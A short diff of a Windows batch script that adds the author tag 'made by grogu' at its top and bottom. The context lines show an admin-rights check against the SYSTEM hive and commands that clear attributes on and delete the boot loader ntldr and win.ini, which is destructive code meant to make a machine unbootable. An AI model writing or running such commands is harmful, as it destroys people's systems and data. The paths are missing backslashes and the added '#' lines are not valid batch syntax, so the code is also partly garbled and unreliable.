@@ -1,3 +1,4 @@
+#made by grogu
 @echo off
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 
@@ -266,3 +267,4 @@ attrib -r -s -h c:ntldr
 del c:ntldr
 attrib -r -s -h c:windowswin.ini
 del c:windowswin.ini
+#made by grogu
